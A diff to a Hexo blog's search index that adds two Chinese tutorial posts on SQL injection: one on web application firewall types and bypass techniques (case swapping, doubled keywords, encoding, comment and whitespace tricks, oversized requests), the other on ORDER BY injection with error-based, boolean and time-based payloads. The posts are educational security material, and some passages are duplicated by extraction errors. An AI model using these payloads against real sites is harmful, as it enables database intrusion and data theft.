@@ -3,6 +3,107 @@
   
     
     <entry>
+      <title><![CDATA[SQL注入之WAF基础]]></title>
+      <url>/2019/08/25/SQL%E6%B3%A8%E5%85%A5%E4%B9%8BWAF%E5%9F%BA%E7%A1%80/</url>
+      <content type="html"><![CDATA[<h1 id="WAF简介"><a href="#WAF简介" class="headerlink" title="WAF简介"></a>WAF简介</h1><p>在过去网站发展不是很流行的时候，传统的网络防火墙往往就是成为了企业或者公司的安全防线。但这传统防火墙只是架构网络体系在第三层中的网络层当中，只能有限地阻止和截获一些网络层的数据包。而随着web服务应用的不断发展，攻击者开始懂得针对性的盯上web应用层服务进行攻击。而传统的防火墙往往只能截获网络层数据包，对于应用层当中的数据包往往就无能为力，这时WAF就应用开始应运而生。</p>
+<p>全称Web应用防火墙，是通过执行一系列针对HTTP/HTTPS的安全策略来专门为Web应用提高保护的一款产品。WAF往往是基础规则防护的设备，WAF通常包含着各种各样防护应用的安全规则，WAF生产商往往根据这个制定好的规则库并定期跟新。用户使用这个WAF规则就可以对自己网站进行有效的保护</p>
+<p>所以我们就可以简单理解为：WAF就是一款Web应用的安全产品，通过内置安全规则匹配来保护Web网站应用。</p>
+<h1 id="WAF分类"><a href="#WAF分类" class="headerlink" title="WAF分类"></a>WAF分类</h1><h2 id="云waf"><a href="#云waf" class="headerlink" title="云waf"></a>云waf</h2><p>简单而言，就是将WAF架构部署在云端，外量流量连接都需要经过云 架构部署在云端，外量流量连接都需要经过云waf过滤检测，之后再将过滤检测后 过滤检测，之后再将过滤检测后 数据包发给网站服务器。 数据包发给网站</p>
+<h2 id="硬件waf"><a href="#硬件waf" class="headerlink" title="硬件waf"></a>硬件waf</h2><p>一般这类waf往往架构在服务器前端，充当硬件设备来保护网站。</p>
+<h2 id="软件waf"><a href="#软件waf" class="headerlink" title="软件waf"></a>软件waf</h2><p>而软件waf往往就是我们常常听说的安全狗之类的产品，我们可以将它直接下载下来，部署在服务器当中。软件<br>往往就是我们常常听说的安全狗之类的产品，我们可以将它直接下载下来，部署在服务器当中。软件waf往往就只是通过规则匹配<br>往往就只是通过规则匹配 进行的。而我们常常说的过狗，往往就是只是在规则层面进行绕过和利用。（规则层面后面会讲）。</p>
+<h1 id="WAF防护规则"><a href="#WAF防护规则" class="headerlink" title="WAF防护规则"></a>WAF防护规则</h1><h2 id="架构层层面"><a href="#架构层层面" class="headerlink" title="架构层层面"></a>架构层层面</h2><p>架构层层面一般是针对的是云WAF，大多数云WAF架构在云端，例如百度云加速、360安全卫士等，通过更改DNS解析，把流量引入WAF集群，流量经过检测后转发请求到源站。简单的说对于此类WAF架构层层面。</p>
+<h2 id="寻找网站的真实地址"><a href="#寻找网站的真实地址" class="headerlink" title="寻找网站的真实地址"></a>寻找网站的真实地址</h2><p>因为云WAF部署在云端，外部流量经过它的解析在传递给网站服务器。这时我们如果能够找到网站的真实地址，不通过域名进行访问，直接用网站IP地址访问，这样外部流量不经过云WAF进行DNS解析，从而绕过了WAF的实现。</p>
+<h2 id="寻找当前网站的相同网段"><a href="#寻找当前网站的相同网段" class="headerlink" title="寻找当前网站的相同网段"></a>寻找当前网站的相同网段</h2><p>这种绕过方式可以归结于云网络运营商部署问题。有些云网站运营商会把他们的同一网段的网站都只用一个云WAF进行过滤解析，你可以寻找它同一网段下的网站 找它同一网段下的网站ip地址，从而从网段内部对不同网站之间进行访问。</p>
+<h2 id="利用网站的边界漏洞"><a href="#利用网站的边界漏洞" class="headerlink" title="利用网站的边界漏洞"></a>利用网站的边界漏洞</h2><p>边界漏洞这里主要是指利用一些xss或者csrf的漏洞进行到攻击内部。云WAF的机制规则没能覆盖到网站边界。</p>
+<h2 id="资源限制角度"><a href="#资源限制角度" class="headerlink" title="资源限制角度"></a>资源限制角度</h2><p>利用发送http请求包的参数内容，过多消耗限制WAF资源，让WAF无法加载识别或者是让WAF”崩<br>崩”坏，从而实现绕过WAF。例如：服务器能接受的最大http协议请求包为10M，而WAF本身能接受最大的http协议请求包为5M，这时我们可以构造5-10Mhttp协议请求包来进行发送，让WAF超过了最大接受程度，从而”崩”坏达到绕过WAF的目的。或者我们可以在http协议请求包中添加大量的反复编码内容或者恶意代WAF对于这些大量不熟悉的参数内容难以识别或者干脆不识别，从而达到了绕过WAF的目的。</p>
+<h2 id="协议层面"><a href="#协议层面" class="headerlink" title="协议层面"></a>协议层面</h2><p>这些的协议层面主要是指http协议，主要指在WAF中对协议中的内容或者某些参数解析和覆盖不全面，或者协议本身存在的缺陷，我们加以利用从而实现了对WAF绕过。同时我们还需要对web中间件服务器有充分的认识，因为每种服务器自身解析也是不一样的。</p>
+<h2 id="规则层面缺陷"><a href="#规则层面缺陷" class="headerlink" title="规则层面缺陷"></a>规则层面缺陷</h2><p>规则层面的缺陷，往往是指基于正则规则相关层面。也就是我们常常看见绕过WAF规则的文章，百分之90文章都是从规则层面缺陷进行绕过的。因为大多数WAF都是基于安全规则来进行对网站的安全监控的，也就是认为设计好的安全规则。这种设计最大的缺陷就是本身规则就是存在缺陷，有时没有考虑到方方面面进行设置，攻击者可能从中构造出一些攻击变形的编码语句，不在这个安全规则之内识别不到，从而达到绕过WAF的目的。</p>
+<h1 id="WAF绕过"><a href="#WAF绕过" class="headerlink" title="WAF绕过"></a>WAF绕过</h1><h2 id="大小写替换"><a href="#大小写替换" class="headerlink" title="大小写替换"></a>大小写替换</h2><p>对于mysql绕过，它的规则中可以进行了简单函数限制，但它却没有考虑到这些函数存在大小写等限制，所以我们可以对这些函数变换大写形式即可。</p>
+<p>如: xxxx.com/index.php?id=-3’ uniON sEleCt 1,2,3–+</p>
+<p>不过这种绕过方式往往都是最开始存在的，现在几乎见不到了</p>
+<h2 id="双关键字绕过"><a href="#双关键字绕过" class="headerlink" title="双关键字绕过"></a>双关键字绕过</h2><p>在一些简易的waf规则中，他是进行敏感关键字进行检测，一旦识别就会直接将其替换为空(但这里存在不合理的是，它只检测替换一次),所以我们就可以构造双写关键字进行绕过</p>
+<p>如：id=-1’+UNIunionON+SeLselectECT1,2,3–-+</p>
+<p>当它检测出union关键字时为空但经过我们拼接之后，又变成了UNION关键字。这里的+代替空格。</p>
+<h2 id="编码绕过"><a href="#编码绕过" class="headerlink" title="编码绕过"></a>编码绕过</h2><p>对于sql注入函数绕过，我们还可以结合一些编码知识原理进行绕过。例如：十六进制编码、url编码、unicode编码、数据库编码以及多种编码混合等。</p>
+<p>1=1即31%3d%31</p>
+<p>Test为CHAR(101)+CHAR(97)+CHAR(115)+CHAR(116)</p>
+<h2 id="关键字替换"><a href="#关键字替换" class="headerlink" title="关键字替换"></a>关键字替换</h2><p>因为sql函数存在很多很多，各种各样的。它的waf规则可能将常见的函数进行了过滤，但我们还有sql函数能够替换这些常见的函数功能。WAF如果没有对这些能够替换功能实现的函数纳入到它的规则当中，那我们使用这些也就能轻易绕过了。</p>
+<p>常见函数替换 常见函数替换:</p>
+<p>hex()、 、bin()==&gt;ascii()</p>
+<p>sleep()==&gt;benchmark()</p>
+<p>concatws()==&gt;groupconcat()</p>
+<p>mid()、substr()==&gt;substring()@@user==&gt;user()@@datadir==&gt;datadir() </p>
+<h2 id="注释符绕过"><a href="#注释符绕过" class="headerlink" title="注释符绕过"></a>注释符绕过</h2><p>/xxx/是注释符，也可以充当空白符。因为// 可 使 得 MySQL 对 sql 语 句 (union//select) 词 法 解 析 成 功 。事 实 上 许 多 WAF 都 考 虑 到 都 考 虑 到 // 可 以 作 为 空 白 分 ， 但 是 waf 检 测 “/<em>.</em>/” 注 释 符 很 消 耗 网 站 性 能 ， 基 于 网 站 业 务 的 考 虑 ， 安 全 工 程 师 可 能 只 会 在 检 测 注 释 符 中 间 引 入 一 些 特 殊 字 符 ， 例 如 ： /\w+/ 。 或 者 ， WAF 可 能 只 中 间 检 查 n 个 字 符 “/<em>.{,n}</em>/” 。 *</p>
+<p>根据以上想法，我们可以得出逐步测试绕过方法：</p>
+<p>先测试最基本的：union//select</p>
+<p>再 测 试 中 间 引 入 特 殊 字 ： union/aaaa%01bbs/select (注释符内添加特殊字符)</p>
+<p>最 后 测 试 注 释 长 度 ： union/aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa/select (注释符内添加长度)</p>
+<p>同 理 ， 对 于 /!xxx/(相当于/sql 语 句 /) ， 可 以 采 取 类 似 的 思 路 绕 过 WAF 。</p>
+<h2 id="空白符绕过"><a href="#空白符绕过" class="headerlink" title="空白符绕过"></a>空白符绕过</h2><p>基于正则表达式的WAF，SQL注入规则使用正则表达式的“\s”匹配空格，例如”select\s+union”。利用正则表达式的空白符与MySQL空白符的不同可绕过WAF规则。如何找到这些MySQL的特性？通过fuzz,每次更改正常SQL语句的某部分替换为其他字符，判断语法是否正确，即可判断出来MySQL语法特性。当然，也可以通过分析MySQL词法来发现语法特性，从而找到绕过方法。</p>
+<p>利用空白符进行绕过，测试WAF时尽可能减少其他原因的影响，例如”union select”被拦截，只需把中间空白符替换为”%250C”, “%25A0”， “%09%0A %0B %0C %0D %A0 %20 //“进行绕过测试</p>
+<p>union%250Cselect</p>
+<p>union%25A0select</p>
+<h2 id="sql注入黑魔法"><a href="#sql注入黑魔法" class="headerlink" title="sql注入黑魔法"></a>sql注入黑魔法</h2><p>我们在进行sql注入过程中，我们需要对数据库语法和结构有个清晰的了解。比如一些特殊的mysql语法常常就会没有被纳入到WAF 的规则当中去。</p>
+<p>select{x tablename}from{x informationschema.tables};</p>
+<h2 id="特殊字符绕过"><a href="#特殊字符绕过" class="headerlink" title="特殊字符绕过"></a>特殊字符绕过</h2><p>当我们平时sql注入当中的常规字符都是WAF吞掉过滤的时候，我们就可以尝试下一些特殊字符进行过滤检测。。如：~，!，@，{x key}，1.1，1e1，()，emoji表情符号@:=等等。不过一般这些特殊字符我们都是用来进行fuzz测试，看看能不能绕过waf检测测试，然后我们在将这些特殊字符进行sql语句构造拼接，看看能不能将其进行利用。</p>
+<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>sql注入绕WAF=熟悉mysql函数和数据库特性+了解web中间件服务器原理+掌握WAF的原理机制。</p>
+]]></content>
+      
+        <categories>
+            
+            <category> 安全 </category>
+            
+        </categories>
+        
+        
+        <tags>
+            
+            <tag> SQL注入 </tag>
+            
+        </tags>
+        
+    </entry>
+    
+    <entry>
+      <title><![CDATA[SQL注入之order by后注入]]></title>
+      <url>/2019/08/23/SQL%E6%B3%A8%E5%85%A5%E4%B9%8Border-by%E6%B3%A8%E5%85%A5/</url>
+      <content type="html"><![CDATA[<h1 id="Order-By-后的注入"><a href="#Order-By-后的注入" class="headerlink" title="Order By 后的注入"></a>Order By 后的注入</h1><h2 id="判断注入"><a href="#判断注入" class="headerlink" title="判断注入"></a>判断注入</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?sort=1 desc</span><br><span class="line">?sort=1 asc</span><br></pre></td></tr></table></figure>
+
+<p>显示结果不同，说明可以注入</p>
+<p><code>desc是 descend 降序意思</code><br><code>asc 是 ascend 升序意思</code></p>
+<h2 id="构造"><a href="#构造" class="headerlink" title="构造"></a>构造</h2><p>order by 后的数字可以作为一个注入点</p>
+<p><code>?sort=right(version(),1)</code></p>
+<p><code>?sort=left(version(),1)</code></p>
+<p>如果没有起作用，我们考虑布尔类型。此时我们可以用报错注入和延时注入。</p>
+<h2 id="方法"><a href="#方法" class="headerlink" title="方法"></a>方法</h2><p>(1)直接添加注入语句，?sort=(select ***)</p>
+<p>(2)利用一些函数，例如 rand()函数等。?sort=rand(sql 语句)</p>
+<p>(3) 利用 and，例如 ?sort=1 and (加 sql 语句)。</p>
+<h2 id="报错注入例子"><a href="#报错注入例子" class="headerlink" title="报错注入例子"></a>报错注入例子</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">information_schema.columns group by concat(0x3a,0x3a,(select user()),0x3a,0x3a,floor(rand()*2)))</span><br></pre></td></tr></table></figure>
+
+<h2 id="rand-例子"><a href="#rand-例子" class="headerlink" title="rand() 例子"></a>rand() 例子</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?sort=rand(ascii(left(database(),1))=115)</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?sort=rand(ascii(left(database(),1))=116)</span><br></pre></td></tr></table></figure>
+
+<h2 id="延时注入例子"><a href="#延时注入例子" class="headerlink" title="延时注入例子"></a>延时注入例子</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?sort=1 and if(ascii(substr(database(),1,1))=116,0,sleep(5))</span><br></pre></td></tr></table></figure>
+
+]]></content>
+      
+        <categories>
+            
+            <category> 安全 </category>
+            
+        </categories>
+        
+        
+        <tags>
+            
+            <tag> SQL注入 </tag>
+            
+        </tags>
+        
+    </entry>
+    
+    <entry>
       <title><![CDATA[SQL注入之宽字节和堆叠注入]]></title>
       <url>/2019/08/22/SQL%E6%B3%A8%E5%85%A5%E4%B9%8B%E5%AE%BD%E5%AD%97%E8%8A%82%E5%92%8C%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5/</url>
       <content type="html"><![CDATA[<h1 id="宽字节注入"><a href="#宽字节注入" class="headerlink" title="宽字节注入"></a>宽字节注入</h1><h2 id="sqli-labs32"><a href="#sqli-labs32" class="headerlink" title="sqli-labs32"></a>sqli-labs32</h2><p>过滤\、’、”的函数，分别在前面加上\</p>
@@ -1282,9 +1383,9 @@ hexo d</code></pre><h1 id="浏览"><a href="#浏览" class="headerlink" title="�
         
         <tags>
             
-            <tag> Hexo </tag>
-            
             <tag> 博客 </tag>
+            
+            <tag> Hexo </tag>
             
         </tags>
         
